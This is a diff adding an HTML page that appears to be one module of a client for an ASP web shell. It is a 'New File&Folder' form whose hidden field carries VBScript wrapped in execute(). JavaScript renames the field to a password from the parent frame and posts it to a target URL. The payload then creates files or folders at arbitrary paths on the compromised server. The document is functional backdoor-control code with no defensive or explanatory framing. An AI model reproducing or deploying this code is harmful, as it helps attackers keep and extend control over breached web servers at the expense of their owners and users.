@@ -1,0 +1,16 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">New File&amp;Folder <br>
+Notice: NewFolder , you shall input <b>f:\test\</b><br>
+NewFile don't overwrite exist file. </div>
+<form name="xform" method="post" target="_blank">
+Path: 
+  <input name="path" type="text" value="f:\test.txt" size="50">
+<input type="hidden" name="code" value='execute("response.clear:thePath=request(""path""):Set fso=CreateObject(""Scripting.FileSystemObject""):if right(thePath,1)=""\"" then:fso.CreateFolder(thePath):StrResult=""Build New Folder <b>""&thePath&""</b> Success!"":else:fso.CreateTextFile thePath,False:StrResult=""Build New File <b>""&thePath&""</b> Success! Now you can edit it."":end if:response.write(StrResult):Response.End")'>
+</form>
+<script>
+function RUNonclick(){
+document.xform.code.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script>
